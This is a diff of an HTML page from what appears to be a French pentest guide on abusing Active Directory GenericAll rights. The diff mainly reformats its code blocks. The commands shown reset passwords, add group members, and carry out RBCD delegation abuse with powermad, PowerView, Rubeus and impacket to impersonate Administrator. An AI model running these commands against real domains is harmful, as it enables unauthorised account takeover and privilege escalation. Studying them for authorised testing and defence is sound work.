@@ -7831,12 +7831,12 @@
 <p>Si un utilisateur a le droit <code>GenericAll</code> sur un autre utilisateur, il est possible de réinitialiser le mot de passe de l'utilisateur cible.</p>
 <h4 id="depuis-windows">Depuis Windows</h4>
 <p>Utilisez la commande suivante pour réinitialiser le mot de passe d'un utilisateur depuis un environnement Windows :</p>
-<pre><code class="language-powershell">net user $userCible $nouveauPassword /domain
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">net</span> <span class="n">user</span> <span class="nv">$userCible</span> <span class="nv">$nouveauPassword</span> <span class="p">/</span><span class="n">domain</span>
+</span></code></pre></div>
 <h4 id="depuis-linux">Depuis Linux</h4>
 <p>Depuis un environnement Linux, vous pouvez utiliser la commande suivante :</p>
-<pre><code class="language-bash">net rpc user password $userCible $nouveauPass -U domain.local/$noreUser -S $dc
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>user<span class="w"> </span>password<span class="w"> </span><span class="nv">$userCible</span><span class="w"> </span><span class="nv">$nouveauPass</span><span class="w"> </span>-U<span class="w"> </span>domain.local/<span class="nv">$noreUser</span><span class="w"> </span>-S<span class="w"> </span><span class="nv">$dc</span>
+</span></code></pre></div>
 <blockquote>
 <p>Mettre un mot de passe en adéquation avec la politique de mot de passe du domaine, sinon celui-ci ne sera pas attribué et rien ne nous l'indique.</p>
 </blockquote>
@@ -7844,48 +7844,48 @@
 <p>Si un utilisateur a le droit <code>GenericAll</code> sur un groupe, il peut s'ajouter en tant que membre de ce groupe.</p>
 <h4 id="depuis-windows_1">Depuis Windows</h4>
 <p>Utilisez les commandes suivantes pour ajouter un utilisateur à un groupe depuis un environnement Windows :</p>
-<pre><code class="language-powershell">net group &quot;$groupeCible&quot; $userCible /add /domain #cmd
-Add-ADGroupMember -Identity &quot;$groupeCible&quot; -Members $userCible #powershell
-Add-ADGroupMember -Identity &quot;$groupeCible&quot; -Members $userCible #powersploit
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">net</span> <span class="nb">group </span><span class="s2">&quot;$groupeCible&quot;</span> <span class="nv">$userCible</span> <span class="p">/</span><span class="n">add</span> <span class="p">/</span><span class="n">domain</span> <span class="c">#cmd</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Add-ADGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;$groupeCible&quot;</span> <span class="n">-Members</span> <span class="nv">$userCible</span> <span class="c">#powershell</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">Add-ADGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;$groupeCible&quot;</span> <span class="n">-Members</span> <span class="nv">$userCible</span> <span class="c">#powersploit</span>
+</span></code></pre></div>
 <h3 id="genericall-sur-une-machine">GenericAll sur une Machine</h3>
 <p>Le droit <code>GenericAll</code> sur une machine permet d'abuser de la Resource-Based Constrained Delegation (RBCD).</p>
 <h4 id="depuis-windows_2">Depuis Windows</h4>
 <p>Pour exploiter ce droit, nous avons besoin des scripts <code>powermad.ps1</code> et <code>powerview</code>.</p>
 <p>Création d'un compte machine :</p>
-<pre><code class="language-powershell">import-module powermad
-New-MachineAccount -MachineAccount paked -Password $(ConvertTo-SecureString 'Sup3P4ssw0rd!' -AsPlainText -Force) -Verbose
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">import-module</span> <span class="n">powermad</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">paked</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Sup3P4ssw0rd!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
+</span></code></pre></div>
 <p>Vérification de la création du compte :</p>
-<pre><code class="language-powershell">Get-DomainComputer
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Get-DomainComputer</span>
+</span></code></pre></div>
 <p>Écriture de la propriété <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p>
-<pre><code class="language-powershell">$ComputerSid = Get-DomainComputer paked -Properties objectsid | Select -Expand objectsid
-
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)&quot;
-
-$SDBytes = New-Object byte[] ($SD.BinaryLength)
-
-$SD.GetBinaryForm($SDBytes, 0)
-
-Get-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nv">$ComputerSid</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="n">paked</span> <span class="n">-Properties</span> <span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Expand</span> <span class="n">objectsid</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)&quot;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="nb">Get-DomainComputer</span> <span class="nv">$cible</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span>
+</span></code></pre></div>
 <p>Récupération du hash du compte machine créé :</p>
-<pre><code>.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
+</span></code></pre></div>
 <p>Récupération du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p>
-<pre><code class="language-powershell">rubeus.exe s4u /user:paked$ /aes256:&lt;aes256&gt; /aes128:&lt;aes128&gt; /rc4:&lt;rc4 hash&gt; /impersonateuser:administrator /msdsspn:cifs/cible /domain:domain.local /ptt /altservice:http/cible
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">paked</span><span class="p">$</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:&lt;</span><span class="n">aes256</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">aes128</span><span class="p">:&lt;</span><span class="n">aes128</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">rc4</span> <span class="n">hash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">cible</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">http</span><span class="p">/</span><span class="n">cible</span>
+</span></code></pre></div>
 <h4 id="depuis-linux_1">Depuis Linux</h4>
 <p>Création d'un compte machine :</p>
-<pre><code class="language-bash">impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass '$password' -dc-host $dc -domain-netbios $DOMAIN 'domain.local\$user:$password'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;COMPUTER$&#39;</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">&#39;$password&#39;</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$dc</span><span class="w"> </span>-domain-netbios<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="s1">&#39;domain.local\$user:$password&#39;</span>
+</span></code></pre></div>
 <p>Écriture de la propriété <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p>
-<pre><code class="language-bash">impacket-rbcd -delegate-from 'paked$' -delegate-to 'cible$' -dc-ip '$dc$' -action 'write' 'domain.local'/'$utilisateur':'$Password'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>impacket-rbcd<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">&#39;paked$&#39;</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">&#39;cible$&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;$dc$&#39;</span><span class="w"> </span>-action<span class="w"> </span><span class="s1">&#39;write&#39;</span><span class="w"> </span><span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;$utilisateur&#39;</span>:<span class="s1">&#39;$Password&#39;</span>
+</span></code></pre></div>
 <p>Récupération du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p>
-<pre><code class="language-bash">impacket-getST -spn 'cifs/$cible' -impersonate Administrator -dc-ip '$dc' 'domain.local/paked$:$password'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>impacket-getST<span class="w"> </span>-spn<span class="w"> </span><span class="s1">&#39;cifs/$cible&#39;</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;$dc&#39;</span><span class="w"> </span><span class="s1">&#39;domain.local/paked$:$password&#39;</span>
+</span></code></pre></div>
 
 
 
@@ -7932,7 +7932,7 @@ Get-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfof
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
